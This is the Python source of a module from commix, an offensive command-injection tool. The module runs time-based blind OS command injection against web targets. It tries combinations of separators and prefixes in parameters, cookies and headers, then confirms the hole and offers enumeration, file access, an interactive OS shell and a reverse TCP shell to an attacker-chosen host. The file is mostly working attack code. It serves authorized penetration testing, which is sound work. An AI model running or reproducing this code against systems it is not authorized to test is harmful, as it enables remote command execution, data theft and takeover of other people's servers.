#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import session_handler

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.shells import reverse_tcp
from src.core.requests import parameters
from src.core.injections.controller import checks

from src.core.injections.blind.techniques.time_based import tb_injector
from src.core.injections.blind.techniques.time_based import tb_payloads
from src.core.injections.blind.techniques.time_based import tb_enumeration
from src.core.injections.blind.techniques.time_based import tb_file_access

readline_error = False
try:
  import readline
except ImportError:
  if settings.IS_WINDOWS:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
  else:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
  pass


"""
The "time-based" injection technique on Blind OS Command Injection.
"""

"""
The "time-based" injection technique handler.
"""
def tb_injection_handler(url, delay, filename, http_request_method, url_time_response):
 
  counter = 1
  num_of_chars = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  possibly_vulnerable = False
  false_positive_warning = False
  export_injection_info = False
  how_long = 0
  how_long_statistic = []
  injection_type = "blind command injection"
  technique = "time-based injection technique"

  if settings.VERBOSITY_LEVEL >= 1:
    info_msg = "Testing the " + technique + "... "
    print settings.print_info_msg(info_msg)

  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = settings.MAXLEN
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    warn_msg = "The '--url-reload' option is not available in " + technique + "."
    print settings.print_warning_msg(warn_msg)

  whitespace = checks.check_whitespaces()
  # Calculate all possible combinations
  total = (len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES) - len(settings.JUNK_COMBINATION))
  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:

        # If a previous session is available.
        if settings.LOAD_SESSION and session_handler.notification(url, technique):
          cmd = shell = ""
          url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
          checks.check_for_stored_tamper(payload)
          settings.FOUND_HOW_LONG = how_long
          settings.FOUND_DIFF = how_long - delay

        if settings.RETEST == True:
          settings.RETEST = False
          from src.core.injections.results_based.techniques.classic import cb_handler
          cb_handler.exploitation(url, delay, filename, http_request_method)

        if not settings.LOAD_SESSION:
          num_of_chars = num_of_chars + 1
          # Check for bad combination of prefix and separator
          combination = prefix + separator
          if combination in settings.JUNK_COMBINATION:
            prefix = ""
          
          # Define alter shell
          alter_shell = menu.options.alter_shell
          
          # Change TAG on every request to prevent false-positive results.
          TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
          tag_length = len(TAG) + 4
          
          for output_length in range(1, int(tag_length)):
            try:
              if alter_shell:
                # Time-based decision payload (check if host is vulnerable).
                payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, delay, http_request_method)
              else:
                # Time-based decision payload (check if host is vulnerable).
                payload = tb_payloads.decision(separator, TAG, output_length, delay, http_request_method)

              # Fix prefixes / suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              # Whitespace fixation
              payload = re.sub(" ", whitespace, payload)

              if settings.TAMPER_SCRIPTS['base64encode']:
                from src.core.tamper import base64encode
                payload = base64encode.encode(payload)

              # Check if defined "--verbose" option.
              if settings.VERBOSITY_LEVEL >= 1:
                payload_msg = payload.replace("\n", "\\n")
                print settings.print_payload(payload_msg)

              # Cookie Injection
              if settings.COOKIE_INJECTION == True:
                # Check if target host is vulnerable to cookie injection.
                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)

              # User-Agent Injection
              elif settings.USER_AGENT_INJECTION == True:
                # Check if target host is vulnerable to user-agent injection.
                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)

              # Referer Injection
              elif settings.REFERER_INJECTION == True:
                # Check if target host is vulnerable to referer injection.
                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload)

              # Custom HTTP header Injection
              elif settings.CUSTOM_HEADER_INJECTION == True:
                # Check if target host is vulnerable to custom http header injection.
                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                how_long = tb_injector.custom_header_injection_test(url, vuln_parameter, payload)

              else:
                # Check if target host is vulnerable.
                how_long, vuln_parameter = tb_injector.injection_test(payload, http_request_method, url)

              # Statistical analysis in time responses.
              how_long_statistic.append(how_long)

              # Injection percentage calculation
              percent = ((num_of_chars * 100) / total)
              float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total * 1.0)),2))

              if percent == 100 and no_result == True:
                if not settings.VERBOSITY_LEVEL >= 1:
                  percent = Fore.RED + "FAILED" + Style.RESET_ALL
                else:
                  percent = ""
              else:
                if (url_time_response == 0 and (how_long - delay) >= 0) or \
                   (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
                   (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :

                  # Time relative false positive fixation.
                  false_positive_fixation = False
                  if len(TAG) == output_length:

                    # Simple statical analysis
                    statistical_anomaly = True
                    if len(set(how_long_statistic[0:5])) == 1:
                      if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:
                        statistical_anomaly = False
                        how_long_statistic = []  

                    if delay <= how_long and not statistical_anomaly:
                      false_positive_fixation = True
                    else:
                      false_positive_warning = True

                  # Identified false positive warning message.
                  if false_positive_warning:
                    warn_msg = "Unexpected time delays have been identified due to unstable "
                    warn_msg += "requests. This behavior may lead to false-positive results.\n"
                    sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
                    while True:
                      question_msg = "How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > "
                      sys.stdout.write(settings.print_question_msg(question_msg))
                      proceed_option = sys.stdin.readline().replace("\n","").lower()
                      if proceed_option.lower() in settings.CHOICE_PROCEED :
                        if proceed_option.lower() == "s":
                          false_positive_fixation = False
                          raise
                        elif proceed_option.lower() == "c":
                          delay = delay + 1
                          false_positive_fixation = True
                          break
                        elif proceed_option.lower() == "q":
                          raise SystemExit()
                      else:
                        if proceed_option == "":
                          proceed_option = "enter"
                        err_msg = "'" + proceed_option + "' is not a valid answer."
                        print settings.print_error_msg(err_msg)
                        pass

                  # Check if false positive fixation is True.
                  if false_positive_fixation:
                    false_positive_fixation = False
                    settings.FOUND_HOW_LONG = how_long
                    settings.FOUND_DIFF = how_long - delay
                    if false_positive_warning:
                      time.sleep(1)
                    randv1 = random.randrange(0, 1)
                    randv2 = random.randrange(1, 2)
                    randvcalc = randv1 + randv2

                    if settings.TARGET_OS == "win":
                      if alter_shell:
                        cmd = settings.WIN_PYTHON_DIR + "python.exe -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                      else:
                        cmd = "powershell.exe -InputFormat none write (" + str(randv1) + " + " + str(randv2) + ")"
                    else:
                      cmd = "expr " + str(randv1) + " + " + str(randv2) + ""

                    # Check for false positive resutls
                    how_long, output = tb_injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response)

                    if (url_time_response == 0 and (how_long - delay) >= 0) or \
                       (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
                       (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :
                      
                      if str(output) == str(randvcalc) and len(TAG) == output_length:
                        possibly_vulnerable = True
                        how_long_statistic = 0
                        if not settings.VERBOSITY_LEVEL >= 1:
                          percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                        else:
                          percent = ""
                    else:
                      break
                  # False positive
                  else:
                    if not settings.VERBOSITY_LEVEL >= 1:
                      percent = str(float_percent)+ "%"
                      info_msg = "Testing the " + technique + "... " +  "[ " + percent + " ]"
                      sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                      sys.stdout.flush()
                    continue    
                else:
                  if not settings.VERBOSITY_LEVEL >= 1:
                    percent = str(float_percent)+ "%"
                    info_msg = "Testing the " + technique + "... " +  "[ " + percent + " ]"
                    sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                    sys.stdout.flush()
                  continue
              if not settings.VERBOSITY_LEVEL >= 1:
                info_msg = "Testing the " + technique + "... " +  "[ " + percent + " ]"
                sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                sys.stdout.flush()

            except KeyboardInterrupt: 
              raise

            except SystemExit:
              raise

            except:
              break
            break
            
        # Yaw, got shellz! 
        # Do some magic tricks!
        if (url_time_response == 0 and (how_long - delay) >= 0) or \
           (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
           (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :  
          if (len(TAG) == output_length) and \
             (possibly_vulnerable == True or settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level):

            found = True
            no_result = False

            if settings.LOAD_SESSION:
              possibly_vulnerable = False

            if settings.COOKIE_INJECTION == True: 
              header_name = " cookie"
              found_vuln_parameter = vuln_parameter
              the_type = " parameter"

            elif settings.USER_AGENT_INJECTION == True: 
              header_name = " User-Agent"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.REFERER_INJECTION == True: 
              header_name = " Referer"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.CUSTOM_HEADER_INJECTION == True: 
              header_name = " " + settings.CUSTOM_HEADER_NAME
              found_vuln_parameter = ""
              the_type = " HTTP header"

            else:
              header_name = ""
              the_type = " parameter"
              if http_request_method == "GET":
                found_vuln_parameter = parameters.vuln_GET_param(url)
              else :
                found_vuln_parameter = vuln_parameter

            if len(found_vuln_parameter) != 0 :
              found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 
            
            # Print the findings to log file.
            if export_injection_info == False:
              export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
            if vp_flag == True:
              vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
            logs.update_payload(filename, counter, payload) 
            counter = counter + 1

            if not settings.LOAD_SESSION:
              print ""

            # Print the findings to terminal.
            success_msg = "The"
            if found_vuln_parameter == " ": 
              success_msg += http_request_method + "" 
            success_msg += the_type + header_name
            success_msg += found_vuln_parameter + " seems injectable via "
            success_msg += "(" + injection_type.split(" ")[0] + ") " + technique + "."
            print settings.print_success_msg(success_msg)
            print settings.SUB_CONTENT_SIGN + "Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL
            # Export session
            if not settings.LOAD_SESSION:
              shell = ""
              session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable=menu.options.level)
              #possibly_vulnerable = False
            else:
              settings.LOAD_SESSION = False 
            
            new_line = False   
            # Check for any enumeration options.
            if settings.ENUMERATION_DONE == True:
              while True:
                question_msg = "Do you want to enumerate again? [Y/n/q] > "
                enumerate_again = raw_input("\n" + settings.print_question_msg(question_msg)).lower()
                if enumerate_again in settings.CHOICE_YES:
                  tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                  print ""
                  break
                elif enumerate_again in settings.CHOICE_NO: 
                  new_line = True
                  break
                elif enumerate_again in settings.CHOICE_QUIT:
                  sys.exit(0)
                else:
                  if enumerate_again == "":
                    enumerate_again = "enter"
                  err_msg = "'" + enumerate_again + "' is not a valid answer."  
                  print settings.print_error_msg(err_msg)
                  pass
            else:
              if menu.enumeration_options():
                tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                print ""

            # Check for any system file access options.
            if settings.FILE_ACCESS_DONE == True:
              print ""
              while True:
                question_msg = "Do you want to access files again? [Y/n/q] > "
                sys.stdout.write(settings.print_question_msg(question_msg))
                file_access_again = sys.stdin.readline().replace("\n","").lower()
                if file_access_again in settings.CHOICE_YES:
                  tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                  break
                elif file_access_again in settings.CHOICE_NO: 
                  if not new_line:
                    new_line = True
                  break 
                elif file_access_again in settings.CHOICE_QUIT:
                  sys.exit(0)
                else:
                  if file_access_again == "":
                    file_access_again = "enter"
                  err_msg = "'" + file_access_again  + "' is not a valid answer."  
                  print settings.print_error_msg(err_msg)
                  pass
            else:
              # if not menu.enumeration_options() and not menu.options.os_cmd:
              #   print ""
              tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)

            # Check if defined single cmd.
            if menu.options.os_cmd:
              cmd = menu.options.os_cmd
              check_how_long, output = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
              # Export injection result
              tb_injector.export_injection_results(cmd, separator, output, check_how_long)
              sys.exit(0)

            if not new_line :
              print ""

            # Pseudo-Terminal shell
            go_back = False
            go_back_again = False
            while True:
              if go_back == True:
                break 
              question_msg = "Do you want a Pseudo-Terminal? [Y/n/q] > "
              sys.stdout.write(settings.print_question_msg(question_msg))
              gotshell = sys.stdin.readline().replace("\n","").lower()
              if gotshell in settings.CHOICE_YES:
                print ""
                print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                if readline_error:
                  checks.no_readline_module()
                while True:
                  if false_positive_warning:
                    warn_msg = "Due to unexpected time delays, it is highly "
                    warn_msg += "recommended to enable the 'reverse_tcp' option.\n"
                    sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
                    false_positive_warning = False
                  try:
                    # Tab compliter
                    if not readline_error:
                      readline.set_completer(menu.tab_completer)
                      # MacOSX tab compliter
                      if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
                        readline.parse_and_bind("bind ^I rl_complete")
                      # Unix tab compliter
                      else:
                        readline.parse_and_bind("tab: complete")
                    cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                    cmd = checks.escaped_cmd(cmd)
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                      if os_shell_option == False:
                        if no_result == True:
                          return False
                        else:
                          return True 
                      elif os_shell_option == "quit":                    
                        sys.exit(0)
                      elif os_shell_option == "back":
                        go_back = True
                        break
                      elif os_shell_option == "os_shell": 
                          warn_msg = "You are already into an 'os_shell' mode."
                          print settings.print_warning_msg(warn_msg)+ "\n"
                      elif os_shell_option == "reverse_tcp":
                        settings.REVERSE_TCP = True
                        # Set up LHOST / LPORT for The reverse TCP connection.
                        reverse_tcp.configure_reverse_tcp()
                        if settings.REVERSE_TCP == False:
                          continue
                        while True:
                          if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
                            result = checks.check_reverse_tcp_options(settings.LHOST)
                          else:  
                            cmd = reverse_tcp.reverse_tcp_options()
                            result = checks.check_reverse_tcp_options(cmd)
                          if result != None:
                            if result == 0:
                              return False
                            elif result == 1 or result == 2:
                              go_back_again = True
                              settings.REVERSE_TCP = False
                              break
                          # Command execution results.
                          from src.core.injections.results_based.techniques.classic import cb_injector
                          separator = checks.time_based_separators(separator, http_request_method)
                          whitespace = settings.WHITESPACE[0]
                          response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                          # Evaluate injection results.
                          shell = cb_injector.injection_results(response, TAG, cmd)
                          # Export injection result
                          if settings.VERBOSITY_LEVEL >= 1:
                            print ""
                          err_msg = "The reverse TCP connection has been failed!"
                          print settings.print_critical_msg(err_msg)
                      else:
                        pass
                      
                    else:
                      print ""
                      if menu.options.ignore_session or \
                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                        # The main command injection exploitation.
                        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                        # Export injection result
                        tb_injector.export_injection_results(cmd, separator, output, check_how_long)
                        if not menu.options.ignore_session :
                          session_handler.store_cmd(url, cmd, output, vuln_parameter)
                      else:
                        output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                        print Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL

                      print ""
                  except KeyboardInterrupt: 
                    raise

                  except SystemExit: 
                    raise
                    
              elif gotshell in settings.CHOICE_NO:
                if checks.next_attack_vector(technique, go_back) == True:
                  break
                else:
                  if no_result == True:
                    return False 
                  else:
                    return True  
                    
              elif gotshell in settings.CHOICE_QUIT:
                sys.exit(0)

              else:
                if gotshell == "":
                  gotshell = "enter"
                err_msg = "'" + gotshell + "' is not a valid answer."
                print settings.print_error_msg(err_msg)
                pass
              #break
          
  if no_result == True:
    print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, http_request_method, url_time_response):
  # Check if attack is based on time delays.
  if not settings.TIME_RELATIVE_ATTACK :
    settings.TIME_RELATIVE_ATTACK = True
  if url_time_response >= settings.SLOW_TARGET_RESPONSE:
    warn_msg = "It is highly recommended, due to serious response delays, "
    warn_msg += "to skip the time-based (blind) technique and to continue "
    warn_msg += "with the file-based (semiblind) technique."
    print settings.print_warning_msg(warn_msg)
    go_back = False
    while True:
      if go_back == True:
        return False
      question_msg = "How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      proceed_option = sys.stdin.readline().replace("\n","").lower()
      if proceed_option.lower() in settings.CHOICE_PROCEED :
        if proceed_option.lower() == "s":
          from src.core.injections.semiblind.techniques.file_based import fb_handler
          fb_handler.exploitation(url, delay, filename, http_request_method, url_time_response)
        elif proceed_option.lower() == "c":
          if tb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
            return False
        elif proceed_option.lower() == "q":
          raise SystemExit()
      else:
        if proceed_option == "":
          proceed_option = "enter"
        err_msg = "'" + proceed_option + "' is not a valid answer."
        print settings.print_error_msg(err_msg)
        pass
  else:
    if tb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
      settings.TIME_RELATIVE_ATTACK = False
      return False
#eof
